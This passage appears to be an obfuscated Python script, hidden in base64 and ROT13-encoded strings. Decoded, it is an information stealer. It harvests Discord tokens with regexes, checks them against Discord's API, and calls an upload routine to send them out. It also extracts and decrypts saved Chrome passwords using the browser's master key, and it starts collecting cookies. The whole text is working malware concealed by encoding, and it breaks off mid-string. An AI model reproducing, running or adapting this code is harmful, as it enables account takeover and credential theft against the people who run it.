R2V0QmFkZ2UoZmxhZ3MpOg0KICAgIGlmIGZsYWdzID09IDA6IHJldHVybiAnJw0KDQogICAgT3duZWRCYWRnZXMgPSAnJw0KICAgIGJhZGdlTGlzdCA9ICBbDQogICAgICAgIHsiTmFtZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgJ1ZhbHVlJzogMTMxMDcyLCAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnRWFybHlfU3VwcG9ydGVyJywgJ1ZhbHVlJzogNTEyLCAnRW1vamknOiAiPDplYXJseV9zdXBwb3J0ZXI6ODc0NzUwODA4NDE0MTEzODIzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAnVmFsdWUnOiAyNTYsICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyYXZlcnknLCAnVmFsdWUnOiA2NCwgJ0Vtb2ppJzogIjw6YnJhdmVyeTo4NzQ3NTA4MDgzODg5NTIwNzU+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgJ1ZhbHVlJzogOCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdQYXJ0bmVyZWRfU2VydmVyX093bmVyJywgJ1ZhbHVlJzogMiwnRW1vamknOiAiPDpwYXJ0bmVyOjg3NDc1MDgwODY3ODM1NDk2ND4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgJ1ZhbHVlJzogMSwgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQ0KDQogICAgXQ0KICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6DQogICAgICAgIGlmIGZsYWdzIC8vIGJhZGdlWyJWYWx1ZSJdICE9IDA6DQogICAgICAgICAgICBPd25lZEJhZGdlcyArPSBiYWRnZVsiRW1vamkiXQ0KICAgICAgICAgICAgZmxhZ3MgPSBmbGFncyAlIGJhZGdlWyJWYWx1ZSJdDQoNCiAgICByZXR1cm4gT3duZWRCYWRnZXMNCg0KZGVmIEdldFRva2VuSW5mbyh0b2tlbik6DQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgfQ0KDQogICAgdXNlcmpzb24gPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkNCiAgICB1c2VybmFtZSA9IHVzZXJqc29uWyJ1c2VybmFtZSJdDQogICAgaGFzaHRhZyA9IHVzZXJqc29uWyJkaXNjcmltaW5hdG9yIl0NCiAgICBlbWFpbCA9IHVzZXJqc29uWyJlbWFpbCJdDQogICAgaWRkID0gdXNlcmpzb25bImlkIl0NCiAgICBwZnAgPSB1c2VyanNvblsiYXZhdGFyIl0NCiAgICBmbGFncyA9IHVzZXJqc29uWyJwdWJsaWNfZmxhZ3MiXQ0KICAgIG5pdHJvID0gIiINCiAgICBwaG9uZSA9ICItIg0KDQogICAgaWYgInByZW1pdW1fdHlwZSIgaW4gdXNlcmpzb246DQogICAgICAgIG5pdHJvdCA9IHVzZXJqc29uWyJwcmVtaXVtX3R5cGUiXQ0KICAgICAgICBpZiBuaXRyb3QgPT0gMToNCiAgICAgICAgICAgIG5pdHJvID0gIjw6Y2xhc3NpYzo4OTYxMTkxNzEwMTkwNjc0MjM+ICINCiAgICAgICAgZWxpZiBuaXRyb3QgPT0gMjoNCiAgICAgICAgICAgIG5pdHJvID0gIjxhOmJvb3N0OjgyNDAzNjc3ODU3MDQxNjEyOT4gPDpjbGFzc2ljOjg5NjExOTE3MTAxOTA2NzQyMz4gIg0KICAgIGlmICJwaG9uZSIgaW4gdXNlcmpzb246IHBob25lID0gZidge3VzZXJqc29uWyJwaG9uZSJdfWAnDQoNCiAgICByZXR1cm4gdXNlcm5hbWUsIGhhc2h0YWcsIGVtYWlsLCBpZGQsIHBmcCwgZmxhZ3MsIG5pdHJvLCBwaG9uZQ0KDQpkZWYgY2hlY2tUb2tlbih0b2tlbik6DQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgfQ0KICAgIHRyeToNCiAgICAgICAgdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL'
love = '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'
god = 'xpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGh9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06DQogICAgICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChyIltcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI1LDExMH0iLCByIm1mYVwuW1x3LV17ODAsOTV9Iik6DQogICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoZWNrVG9rZW4odG9rZW4pOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b2tlbiBpbiBUb2tlbnM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRva2VucyArPSB0b2tlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGxvYWRUb2tlbih0b2tlbiwgcGF0aCkNCg0KUGFzc3cgPSBbXQ0KZGVmIGdldFBhc3N3KHBhdGgsIGFyZyk6DQogICAgZ2xvYmFsIFBhc3N3DQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4NCg0KICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvTG9naW4gRGF0YSINCiAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybg0KDQogICAgdGVtcGZvbGQgPSB0ZW1wICsgIndwIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiDQoNCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQ0KICAgIGNvbm4gPSBzcWxfY29ubmVjdCh0ZW1wZm9sZCkNCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpDQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM7IikNCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkNCiAgICBjdXJzb3IuY2xvc2UoKQ0KICAgIGNvbm4uY2xvc2UoKQ0KICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkNCg0KICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSINCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpDQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQ0KICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pDQoNCiAgICBmb3Igcm93IGluIGRhdGE6DQogICAgICAgIGlmIHJvd1swXSAhPSAnJzoNCiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOg0KICAgICAgICAgICAgICAgIG9sZCA9IHdhDQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToNCiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2ENCiAgICAgICAgICAgICAgICAgICAgd2EgPSB0bXAuc3BsaXQoJ1snKVsxXS5zcGxpdCgnXScpWzBdDQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOg0KICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpDQogICAgICAgICAgICBQYXNzdy5hcHBlbmQoZiJVUjE6IHtyb3dbMF19IHwgVTUzUk40TTM6IHtyb3dbMV19IHwgUDQ1NVcwUkQ6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQ0KICAgICAgICAjIHByaW50KFtyb3dbMF0sIHJvd1sxXSwgRGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSldKQ0KICAgIHdyaXRlZm9yZmlsZShQYXNzdywgJ3Bhc3N3JykNCg0KQ29va2llcyA9IFtdDQpkZWYgZ2V0Q29va2llKHBhdGgsIGFyZyk6DQogICAgZ2xvYmFsIENvb2tpZXMNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybg0KDQogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Db29raWVzIg0KICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuDQoNCiAgICB0ZW1wZm9sZCA9IHRlbXAgKyAid3AiICsgJycuam9pbihyYW5kb20uY2hva